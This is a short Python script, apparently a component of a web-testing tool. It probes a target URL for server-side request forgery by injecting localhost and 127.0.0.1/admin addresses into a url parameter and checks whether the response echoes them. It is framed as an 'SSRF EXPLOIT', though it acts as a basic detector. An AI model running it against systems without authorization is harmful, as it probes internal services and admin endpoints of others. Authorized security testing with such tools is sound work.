import requests
from termcolor import cprint

def exploit(url, mode='default'):
    if mode == 'default':
        payload = 'http://localhost:80'
    elif mode == 'new':
        payload = 'http://127.0.0.1/admin'
    else:
        cprint(f"[SSRF EXPLOIT] Unknown mode '{mode}' specified.", "red")
        return

    test_url = url if "?" in url else f"{url}?url="
    full_url = test_url + payload

    try:
        r = requests.get(full_url, timeout=10)
        if "localhost" in r.text or "127.0.0.1" in r.text:
            cprint("[SSRF EXPLOIT] Possible SSRF vulnerability!", "green", attrs=['bold'])
            cprint(f" -> {full_url}", "cyan")
        else:
            cprint("[SSRF EXPLOIT] No SSRF vulnerability detected.", "yellow")
    except requests.RequestException:
        cprint("[SSRF EXPLOIT] Request failed.", "red")
